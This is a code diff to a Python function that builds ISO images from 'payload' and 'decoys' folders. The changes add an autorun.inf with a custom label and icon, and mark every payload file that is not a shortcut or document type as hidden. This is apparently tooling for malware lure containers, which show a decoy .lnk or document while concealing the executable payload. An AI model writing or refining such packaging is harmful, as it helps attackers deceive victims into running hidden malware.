@@ -1,6 +1,6 @@
 import pathlib
 import shutil
-from pycdlib import PyCdlib
+from pycdlib import PyCdlib, pycdlibexception
 
 REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
 DEFAULT_ROOT = REPO_ROOT / "agent_code"
@@ -24,6 +24,8 @@ def build_iso(volume_id: str = "SYSTEM",
     container_dir = root_dir / "container"
     payload_dir = root_dir / "payload"
     decoy_dir = root_dir / "decoys"
+    
+    VISIBLE_EXTENSIONS = {'.lnk', '.pdf', '.docx', '.xlsx', '.txt'}
 
     try:
         for item in decoy_dir.rglob('*'):
@@ -38,7 +40,8 @@ def build_iso(volume_id: str = "SYSTEM",
         
         if enable_autorun:
             autorun_content = f"""[autorun]
-TODO
+Label={volume_id}
+Icon=shell32.dll,4
 """
             autorun_path = payload_dir / "autorun.inf"
             autorun_path.write_text(autorun_content)
@@ -54,6 +57,8 @@ TODO
             vol_ident=volume_id
         )
         
+        files_to_hide= []
+        
         for item in payload_dir.rglob('*'):
             if any(part.startswith('.') for part in item.relative_to(payload_dir).parts):
                 continue
@@ -67,6 +72,15 @@ TODO
                     iso_path=iso_path.upper(), 
                     joliet_path=iso_path
                 )
+                
+            if (item.suffix.lower() not in VISIBLE_EXTENSIONS):
+                files_to_hide.append(iso_path)
+        
+        for h_file in files_to_hide:
+            try:
+                iso.set_hidden(joliet_path=h_file)
+            except pycdlibexception.PyCdlibInvalidInput:
+                print(f"[!] Warning: Could not hide {h_file}")
         
         iso.write(str(archive_path))
         iso.close()
